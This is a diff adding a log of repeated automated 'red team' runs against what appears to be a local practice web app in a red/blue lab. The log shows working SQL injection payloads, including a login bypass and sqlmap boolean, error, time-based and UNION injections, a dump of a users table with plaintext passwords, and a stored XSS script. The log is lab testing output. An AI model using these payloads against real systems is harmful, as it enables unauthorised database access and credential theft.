@@ -1,0 +1,2269 @@
+================================================
+🔴 Red Team Attack Report - 2026-09-19T06:41:47Z
+================================================
+
+[1] 🔍 NMAP SCAN
+/usr/bin/nmap: 6: exec: /usr/lib/nmap/nmap: Operation not permitted
+
+[2] 💉 SQL INJECTION - Manual Test
+✅ SQL Injection SUCCESSFUL! Bypassed login!
+   Payload: admin' OR '1'='1
+Welcome admin!
+
+[3] 🤖 SQLMAP AUTO SCAN
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.10.8#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 06:41:47 /2026-09-19/
+
+[06:41:47] [WARNING] using '/home/kali/ai-red-blue-lab/logs/sqlmap' as the output directory
+[06:41:48] [INFO] resuming back-end DBMS 'sqlite' 
+[06:41:48] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: SQLite AND boolean-based blind - WHERE or HAVING clause (JSON)
+    Payload: username=admin' AND CASE WHEN 3842=3842 THEN 3842 ELSE JSON(CHAR(111,100,116,79)) END AND 'zRxW'='zRxW&password=test
+
+    Type: error-based
+    Title: SQLite >= 3.9 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON path)
+    Payload: username=admin' AND 3385=JSON_EXTRACT(CHAR(123,125),CHAR(113,122,113,113,113)||(SELECT (CASE WHEN (3385=3385) THEN 1 ELSE 0 END))||CHAR(113,122,113,107,113)) AND 'JiVg'='JiVg&password=test
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: username=admin' AND 8859=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'PzAs'='PzAs&password=test
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: username=-4742' UNION ALL SELECT NULL,CHAR(113,122,113,113,113)||CHAR(74,121,65,71,108,77,69,88,115,87,111,74,110,72,73,109,80,65,101,114,75,121,78,84,82,120,77,85,84,103,90,116,119,85,78,90,74,108,106,99)||CHAR(113,122,113,107,113),NULL-- OiVT&password=test
+---
+[06:41:48] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[06:41:48] [INFO] fetching tables for database: 'SQLite_masterdb'
+[06:41:48] [INFO] fetching columns for table 'users' 
+[06:41:48] [INFO] fetching entries for table 'users'
+Database: <current>
+Table: users
+[2 entries]
++----+-----------+----------+
+| id | password  | username |
++----+-----------+----------+
+| 1  | secret123 | admin    |
+| 2  | pass456   | alice    |
++----+-----------+----------+
+
+[06:41:48] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/users.csv'
+[06:41:48] [INFO] fetching columns for table 'comments' 
+[06:41:48] [INFO] fetching entries for table 'comments'
+[06:41:48] [INFO] fetching number of entries for table 'comments' in database 'SQLite_masterdb'
+[06:41:48] [INFO] resumed: 0
+[06:41:48] [WARNING] table 'comments' in database 'SQLite_masterdb' appears to be empty
+Database: <current>
+Table: comments
+[0 entries]
++----+---------+
+| id | content |
++----+---------+
++----+---------+
+
+[06:41:48] [INFO] table 'SQLite_masterdb.comments' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/comments.csv'
+[06:41:48] [INFO] fetched data logged to text files under '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost'
+
+[*] ending @ 06:41:48 /2026-09-19/
+
+
+[4] 🎭 STORED XSS TEST
+✅ Stored XSS SUCCESSFUL!
+   Payload stored and reflected: <script>alert("XSS_PWNED")</script>
+
+================================================
+📋 SUMMARY
+================================================
+Target: http://localhost:5000
+Report: /home/kali/ai-red-blue-lab/logs/red_team_report.txt
+Completed: 2026-09-19T06:41:48Z
+================================================
+🔴 Red Team Attack Report - 2026-09-19T07:56:27Z
+================================================
+
+[1] 🔍 NMAP SCAN
+/usr/bin/nmap: 6: exec: /usr/lib/nmap/nmap: Operation not permitted
+
+[2] 💉 SQL INJECTION - Manual Test
+✅ SQL Injection SUCCESSFUL! Bypassed login!
+   Payload: admin' OR '1'='1
+Welcome admin!
+
+[3] 🤖 SQLMAP AUTO SCAN
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.10.8#stable}
+|_ -| . [']     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 07:56:27 /2026-09-19/
+
+[?1049h[22;0;0t[1;24r(B[m[4l[?7h[24;1H[?1049l[23;0;0t[?1l>[07:56:27] [WARNING] using '/home/kali/ai-red-blue-lab/logs/sqlmap' as the output directory
+[1/1] URL:
+GET http://localhost:5000/login
+POST data: username=admin&password=test
+do you want to test this URL? [Y/n/q]
+> Y
+[07:56:27] [INFO] testing URL 'http://localhost:5000/login'
+[07:56:27] [INFO] resuming back-end DBMS 'sqlite' 
+[07:56:27] [INFO] using '/home/kali/ai-red-blue-lab/logs/sqlmap/results-09192026_0756am.csv' as the CSV results file in multiple targets mode
+[07:56:27] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: SQLite AND boolean-based blind - WHERE or HAVING clause (JSON)
+    Payload: username=admin' AND CASE WHEN 3842=3842 THEN 3842 ELSE JSON(CHAR(111,100,116,79)) END AND 'zRxW'='zRxW&password=test
+
+    Type: error-based
+    Title: SQLite >= 3.9 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON path)
+    Payload: username=admin' AND 3385=JSON_EXTRACT(CHAR(123,125),CHAR(113,122,113,113,113)||(SELECT (CASE WHEN (3385=3385) THEN 1 ELSE 0 END))||CHAR(113,122,113,107,113)) AND 'JiVg'='JiVg&password=test
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: username=admin' AND 8859=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'PzAs'='PzAs&password=test
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: username=-4742' UNION ALL SELECT NULL,CHAR(113,122,113,113,113)||CHAR(74,121,65,71,108,77,69,88,115,87,111,74,110,72,73,109,80,65,101,114,75,121,78,84,82,120,77,85,84,103,90,116,119,85,78,90,74,108,106,99)||CHAR(113,122,113,107,113),NULL-- OiVT&password=test
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[07:56:27] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[07:56:27] [INFO] fetching tables for database: 'SQLite_masterdb'
+[07:56:27] [INFO] fetching columns for table 'comments' 
+[07:56:27] [INFO] fetching entries for table 'comments'
+[07:56:27] [INFO] fetching number of entries for table 'comments' in database 'SQLite_masterdb'
+[07:56:27] [INFO] resumed: 0
+[07:56:27] [WARNING] table 'comments' in database 'SQLite_masterdb' appears to be empty
+Database: <current>
+Table: comments
+[0 entries]
++----+---------+
+| id | content |
++----+---------+
++----+---------+
+
+[07:56:27] [INFO] table 'SQLite_masterdb.comments' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/comments.csv'
+[07:56:27] [INFO] fetching columns for table 'users' 
+[07:56:27] [INFO] fetching entries for table 'users'
+Database: <current>
+Table: users
+[2 entries]
++----+-----------+----------+
+| id | password  | username |
++----+-----------+----------+
+| 1  | secret123 | admin    |
+| 2  | pass456   | alice    |
++----+-----------+----------+
+
+[07:56:27] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/users.csv'
+[07:56:27] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/results-09192026_0756am.csv'
+
+[*] ending @ 07:56:27 /2026-09-19/
+
+
+[4] 🎭 STORED XSS TEST
+✅ Stored XSS SUCCESSFUL!
+   Payload stored and reflected: <script>alert("XSS_PWNED")</script>
+
+================================================
+📋 SUMMARY
+================================================
+Target: http://localhost:5000
+Report: /home/kali/ai-red-blue-lab/logs/red_team_report.txt
+Completed: 2026-09-19T07:56:28Z
+================================================
+🔴 Red Team Attack Report - 2026-09-19T07:58:35Z
+================================================
+
+[1] 🔍 NMAP SCAN
+/usr/bin/nmap: 6: exec: /usr/lib/nmap/nmap: Operation not permitted
+
+[2] 💉 SQL INJECTION - Manual Test
+✅ SQL Injection SUCCESSFUL! Bypassed login!
+   Payload: admin' OR '1'='1
+Welcome admin!
+
+[3] 🤖 SQLMAP AUTO SCAN
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.10.8#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 07:58:35 /2026-09-19/
+
+[?1049h[22;0;0t[1;24r(B[m[4l[?7h[24;1H[?1049l[23;0;0t[?1l>[07:58:35] [WARNING] using '/home/kali/ai-red-blue-lab/logs/sqlmap' as the output directory
+[1/1] URL:
+GET http://localhost:5000/login
+POST data: username=admin&password=test
+do you want to test this URL? [Y/n/q]
+> Y
+[07:58:36] [INFO] testing URL 'http://localhost:5000/login'
+[07:58:36] [INFO] resuming back-end DBMS 'sqlite' 
+[07:58:36] [INFO] using '/home/kali/ai-red-blue-lab/logs/sqlmap/results-09192026_0758am.csv' as the CSV results file in multiple targets mode
+[07:58:36] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: SQLite AND boolean-based blind - WHERE or HAVING clause (JSON)
+    Payload: username=admin' AND CASE WHEN 3842=3842 THEN 3842 ELSE JSON(CHAR(111,100,116,79)) END AND 'zRxW'='zRxW&password=test
+
+    Type: error-based
+    Title: SQLite >= 3.9 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON path)
+    Payload: username=admin' AND 3385=JSON_EXTRACT(CHAR(123,125),CHAR(113,122,113,113,113)||(SELECT (CASE WHEN (3385=3385) THEN 1 ELSE 0 END))||CHAR(113,122,113,107,113)) AND 'JiVg'='JiVg&password=test
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: username=admin' AND 8859=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'PzAs'='PzAs&password=test
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: username=-4742' UNION ALL SELECT NULL,CHAR(113,122,113,113,113)||CHAR(74,121,65,71,108,77,69,88,115,87,111,74,110,72,73,109,80,65,101,114,75,121,78,84,82,120,77,85,84,103,90,116,119,85,78,90,74,108,106,99)||CHAR(113,122,113,107,113),NULL-- OiVT&password=test
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[07:58:36] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[07:58:36] [INFO] fetching tables for database: 'SQLite_masterdb'
+[07:58:36] [INFO] fetching columns for table 'comments' 
+[07:58:36] [INFO] fetching entries for table 'comments'
+[07:58:36] [INFO] fetching number of entries for table 'comments' in database 'SQLite_masterdb'
+[07:58:36] [INFO] resumed: 0
+[07:58:36] [WARNING] table 'comments' in database 'SQLite_masterdb' appears to be empty
+Database: <current>
+Table: comments
+[0 entries]
++----+---------+
+| id | content |
++----+---------+
++----+---------+
+
+[07:58:36] [INFO] table 'SQLite_masterdb.comments' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/comments.csv'
+[07:58:36] [INFO] fetching columns for table 'users' 
+[07:58:36] [INFO] fetching entries for table 'users'
+Database: <current>
+Table: users
+[2 entries]
++----+-----------+----------+
+| id | password  | username |
++----+-----------+----------+
+| 1  | secret123 | admin    |
+| 2  | pass456   | alice    |
++----+-----------+----------+
+
+[07:58:36] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/users.csv'
+[07:58:36] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/results-09192026_0758am.csv'
+
+[*] ending @ 07:58:36 /2026-09-19/
+
+
+[4] 🎭 STORED XSS TEST
+✅ Stored XSS SUCCESSFUL!
+   Payload stored and reflected: <script>alert("XSS_PWNED")</script>
+
+================================================
+📋 SUMMARY
+================================================
+Target: http://localhost:5000
+Report: /home/kali/ai-red-blue-lab/logs/red_team_report.txt
+Completed: 2026-09-19T07:58:36Z
+================================================
+🔴 Red Team Attack Report - 2026-09-19T08:00:43Z
+================================================
+
+[1] 🔍 NMAP SCAN
+/usr/bin/nmap: 6: exec: /usr/lib/nmap/nmap: Operation not permitted
+
+[2] 💉 SQL INJECTION - Manual Test
+✅ SQL Injection SUCCESSFUL! Bypassed login!
+   Payload: admin' OR '1'='1
+Welcome admin!
+
+[3] 🤖 SQLMAP AUTO SCAN
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.10.8#stable}
+|_ -| . [']     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 08:00:44 /2026-09-19/
+
+[?1049h[22;0;0t[1;24r(B[m[4l[?7h[24;1H[?1049l[23;0;0t[?1l>[08:00:44] [WARNING] using '/home/kali/ai-red-blue-lab/logs/sqlmap' as the output directory
+[1/1] URL:
+GET http://localhost:5000/login
+POST data: username=admin&password=test
+do you want to test this URL? [Y/n/q]
+> Y
+[08:00:44] [INFO] testing URL 'http://localhost:5000/login'
+[08:00:44] [INFO] resuming back-end DBMS 'sqlite' 
+[08:00:44] [INFO] using '/home/kali/ai-red-blue-lab/logs/sqlmap/results-09192026_0800am.csv' as the CSV results file in multiple targets mode
+[08:00:44] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: SQLite AND boolean-based blind - WHERE or HAVING clause (JSON)
+    Payload: username=admin' AND CASE WHEN 3842=3842 THEN 3842 ELSE JSON(CHAR(111,100,116,79)) END AND 'zRxW'='zRxW&password=test
+
+    Type: error-based
+    Title: SQLite >= 3.9 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON path)
+    Payload: username=admin' AND 3385=JSON_EXTRACT(CHAR(123,125),CHAR(113,122,113,113,113)||(SELECT (CASE WHEN (3385=3385) THEN 1 ELSE 0 END))||CHAR(113,122,113,107,113)) AND 'JiVg'='JiVg&password=test
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: username=admin' AND 8859=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'PzAs'='PzAs&password=test
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: username=-4742' UNION ALL SELECT NULL,CHAR(113,122,113,113,113)||CHAR(74,121,65,71,108,77,69,88,115,87,111,74,110,72,73,109,80,65,101,114,75,121,78,84,82,120,77,85,84,103,90,116,119,85,78,90,74,108,106,99)||CHAR(113,122,113,107,113),NULL-- OiVT&password=test
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[08:00:44] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[08:00:44] [INFO] fetching tables for database: 'SQLite_masterdb'
+[08:00:44] [INFO] fetching columns for table 'users' 
+[08:00:44] [INFO] fetching entries for table 'users'
+Database: <current>
+Table: users
+[2 entries]
++----+-----------+----------+
+| id | password  | username |
++----+-----------+----------+
+| 1  | secret123 | admin    |
+| 2  | pass456   | alice    |
++----+-----------+----------+
+
+[08:00:44] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/users.csv'
+[08:00:44] [INFO] fetching columns for table 'comments' 
+[08:00:44] [INFO] fetching entries for table 'comments'
+[08:00:44] [INFO] fetching number of entries for table 'comments' in database 'SQLite_masterdb'
+[08:00:44] [INFO] resumed: 0
+[08:00:44] [WARNING] table 'comments' in database 'SQLite_masterdb' appears to be empty
+Database: <current>
+Table: comments
+[0 entries]
++----+---------+
+| id | content |
++----+---------+
++----+---------+
+
+[08:00:44] [INFO] table 'SQLite_masterdb.comments' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/comments.csv'
+[08:00:44] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/results-09192026_0800am.csv'
+
+[*] ending @ 08:00:44 /2026-09-19/
+
+
+[4] 🎭 STORED XSS TEST
+✅ Stored XSS SUCCESSFUL!
+   Payload stored and reflected: <script>alert("XSS_PWNED")</script>
+
+================================================
+📋 SUMMARY
+================================================
+Target: http://localhost:5000
+Report: /home/kali/ai-red-blue-lab/logs/red_team_report.txt
+Completed: 2026-09-19T08:00:44Z
+================================================
+🔴 Red Team Attack Report - 2026-09-19T08:02:52Z
+================================================
+
+[1] 🔍 NMAP SCAN
+/usr/bin/nmap: 6: exec: /usr/lib/nmap/nmap: Operation not permitted
+
+[2] 💉 SQL INJECTION - Manual Test
+✅ SQL Injection SUCCESSFUL! Bypassed login!
+   Payload: admin' OR '1'='1
+Welcome admin!
+
+[3] 🤖 SQLMAP AUTO SCAN
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.10.8#stable}
+|_ -| . [(]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 08:02:52 /2026-09-19/
+
+[?1049h[22;0;0t[1;24r(B[m[4l[?7h[24;1H[?1049l[23;0;0t[?1l>[08:02:52] [WARNING] using '/home/kali/ai-red-blue-lab/logs/sqlmap' as the output directory
+[1/1] URL:
+GET http://localhost:5000/login
+POST data: username=admin&password=test
+do you want to test this URL? [Y/n/q]
+> Y
+[08:02:52] [INFO] testing URL 'http://localhost:5000/login'
+[08:02:52] [INFO] resuming back-end DBMS 'sqlite' 
+[08:02:52] [INFO] using '/home/kali/ai-red-blue-lab/logs/sqlmap/results-09192026_0802am.csv' as the CSV results file in multiple targets mode
+[08:02:52] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: SQLite AND boolean-based blind - WHERE or HAVING clause (JSON)
+    Payload: username=admin' AND CASE WHEN 3842=3842 THEN 3842 ELSE JSON(CHAR(111,100,116,79)) END AND 'zRxW'='zRxW&password=test
+
+    Type: error-based
+    Title: SQLite >= 3.9 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON path)
+    Payload: username=admin' AND 3385=JSON_EXTRACT(CHAR(123,125),CHAR(113,122,113,113,113)||(SELECT (CASE WHEN (3385=3385) THEN 1 ELSE 0 END))||CHAR(113,122,113,107,113)) AND 'JiVg'='JiVg&password=test
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: username=admin' AND 8859=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'PzAs'='PzAs&password=test
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: username=-4742' UNION ALL SELECT NULL,CHAR(113,122,113,113,113)||CHAR(74,121,65,71,108,77,69,88,115,87,111,74,110,72,73,109,80,65,101,114,75,121,78,84,82,120,77,85,84,103,90,116,119,85,78,90,74,108,106,99)||CHAR(113,122,113,107,113),NULL-- OiVT&password=test
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[08:02:52] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[08:02:52] [INFO] fetching tables for database: 'SQLite_masterdb'
+[08:02:52] [INFO] fetching columns for table 'comments' 
+[08:02:52] [INFO] fetching entries for table 'comments'
+[08:02:52] [INFO] fetching number of entries for table 'comments' in database 'SQLite_masterdb'
+[08:02:52] [INFO] resumed: 0
+[08:02:52] [WARNING] table 'comments' in database 'SQLite_masterdb' appears to be empty
+Database: <current>
+Table: comments
+[0 entries]
++----+---------+
+| id | content |
++----+---------+
++----+---------+
+
+[08:02:52] [INFO] table 'SQLite_masterdb.comments' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/comments.csv'
+[08:02:52] [INFO] fetching columns for table 'users' 
+[08:02:52] [INFO] fetching entries for table 'users'
+Database: <current>
+Table: users
+[2 entries]
++----+-----------+----------+
+| id | password  | username |
++----+-----------+----------+
+| 1  | secret123 | admin    |
+| 2  | pass456   | alice    |
++----+-----------+----------+
+
+[08:02:52] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/users.csv'
+[08:02:52] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/results-09192026_0802am.csv'
+
+[*] ending @ 08:02:52 /2026-09-19/
+
+
+[4] 🎭 STORED XSS TEST
+✅ Stored XSS SUCCESSFUL!
+   Payload stored and reflected: <script>alert("XSS_PWNED")</script>
+
+================================================
+📋 SUMMARY
+================================================
+Target: http://localhost:5000
+Report: /home/kali/ai-red-blue-lab/logs/red_team_report.txt
+Completed: 2026-09-19T08:02:52Z
+================================================
+🔴 Red Team Attack Report - 2026-09-19T08:03:55Z
+================================================
+
+[1] 🔍 NMAP SCAN
+/usr/bin/nmap: 6: exec: /usr/lib/nmap/nmap: Operation not permitted
+
+[2] 💉 SQL INJECTION - Manual Test
+✅ SQL Injection SUCCESSFUL! Bypassed login!
+   Payload: admin' OR '1'='1
+Welcome admin!
+
+[3] 🤖 SQLMAP AUTO SCAN
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.10.8#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 08:03:55 /2026-09-19/
+
+[?1049h[22;0;0t[1;24r(B[m[4l[?7h[24;1H[?1049l[23;0;0t[?1l>[08:03:55] [WARNING] using '/home/kali/ai-red-blue-lab/logs/sqlmap' as the output directory
+[1/1] URL:
+GET http://localhost:5000/login
+POST data: username=admin&password=test
+do you want to test this URL? [Y/n/q]
+> Y
+[08:03:55] [INFO] testing URL 'http://localhost:5000/login'
+[08:03:55] [INFO] resuming back-end DBMS 'sqlite' 
+[08:03:55] [INFO] using '/home/kali/ai-red-blue-lab/logs/sqlmap/results-09192026_0803am.csv' as the CSV results file in multiple targets mode
+[08:03:55] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: SQLite AND boolean-based blind - WHERE or HAVING clause (JSON)
+    Payload: username=admin' AND CASE WHEN 3842=3842 THEN 3842 ELSE JSON(CHAR(111,100,116,79)) END AND 'zRxW'='zRxW&password=test
+
+    Type: error-based
+    Title: SQLite >= 3.9 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON path)
+    Payload: username=admin' AND 3385=JSON_EXTRACT(CHAR(123,125),CHAR(113,122,113,113,113)||(SELECT (CASE WHEN (3385=3385) THEN 1 ELSE 0 END))||CHAR(113,122,113,107,113)) AND 'JiVg'='JiVg&password=test
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: username=admin' AND 8859=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'PzAs'='PzAs&password=test
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: username=-4742' UNION ALL SELECT NULL,CHAR(113,122,113,113,113)||CHAR(74,121,65,71,108,77,69,88,115,87,111,74,110,72,73,109,80,65,101,114,75,121,78,84,82,120,77,85,84,103,90,116,119,85,78,90,74,108,106,99)||CHAR(113,122,113,107,113),NULL-- OiVT&password=test
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[08:03:55] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[08:03:55] [INFO] fetching tables for database: 'SQLite_masterdb'
+[08:03:55] [INFO] fetching columns for table 'comments' 
+[08:03:55] [INFO] fetching entries for table 'comments'
+[08:03:55] [INFO] fetching number of entries for table 'comments' in database 'SQLite_masterdb'
+[08:03:55] [INFO] resumed: 0
+[08:03:55] [WARNING] table 'comments' in database 'SQLite_masterdb' appears to be empty
+Database: <current>
+Table: comments
+[0 entries]
++----+---------+
+| id | content |
++----+---------+
++----+---------+
+
+[08:03:55] [INFO] table 'SQLite_masterdb.comments' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/comments.csv'
+[08:03:55] [INFO] fetching columns for table 'users' 
+[08:03:55] [INFO] fetching entries for table 'users'
+Database: <current>
+Table: users
+[2 entries]
++----+-----------+----------+
+| id | password  | username |
++----+-----------+----------+
+| 1  | secret123 | admin    |
+| 2  | pass456   | alice    |
++----+-----------+----------+
+
+[08:03:55] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/users.csv'
+[08:03:55] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/results-09192026_0803am.csv'
+
+[*] ending @ 08:03:55 /2026-09-19/
+
+
+[4] 🎭 STORED XSS TEST
+✅ Stored XSS SUCCESSFUL!
+   Payload stored and reflected: <script>alert("XSS_PWNED")</script>
+
+================================================
+📋 SUMMARY
+================================================
+Target: http://localhost:5000
+Report: /home/kali/ai-red-blue-lab/logs/red_team_report.txt
+Completed: 2026-09-19T08:03:56Z
+================================================
+🔴 Red Team Attack Report - 2026-09-19T08:05:49Z
+================================================
+
+[1] 🔍 NMAP SCAN
+/usr/bin/nmap: 6: exec: /usr/lib/nmap/nmap: Operation not permitted
+
+[2] 💉 SQL INJECTION - Manual Test
+✅ SQL Injection SUCCESSFUL! Bypassed login!
+   Payload: admin' OR '1'='1
+Welcome admin!
+
+[3] 🤖 SQLMAP AUTO SCAN
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.10.8#stable}
+|_ -| . [(]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 08:05:49 /2026-09-19/
+
+[?1049h[22;0;0t[1;24r(B[m[4l[?7h[24;1H[?1049l[23;0;0t[?1l>[08:05:49] [WARNING] using '/home/kali/ai-red-blue-lab/logs/sqlmap' as the output directory
+[1/1] URL:
+GET http://localhost:5000/login
+POST data: username=admin&password=test
+do you want to test this URL? [Y/n/q]
+> Y
+[08:05:49] [INFO] testing URL 'http://localhost:5000/login'
+[08:05:49] [INFO] resuming back-end DBMS 'sqlite' 
+[08:05:49] [INFO] using '/home/kali/ai-red-blue-lab/logs/sqlmap/results-09192026_0805am.csv' as the CSV results file in multiple targets mode
+[08:05:49] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: SQLite AND boolean-based blind - WHERE or HAVING clause (JSON)
+    Payload: username=admin' AND CASE WHEN 3842=3842 THEN 3842 ELSE JSON(CHAR(111,100,116,79)) END AND 'zRxW'='zRxW&password=test
+
+    Type: error-based
+    Title: SQLite >= 3.9 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON path)
+    Payload: username=admin' AND 3385=JSON_EXTRACT(CHAR(123,125),CHAR(113,122,113,113,113)||(SELECT (CASE WHEN (3385=3385) THEN 1 ELSE 0 END))||CHAR(113,122,113,107,113)) AND 'JiVg'='JiVg&password=test
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: username=admin' AND 8859=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'PzAs'='PzAs&password=test
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
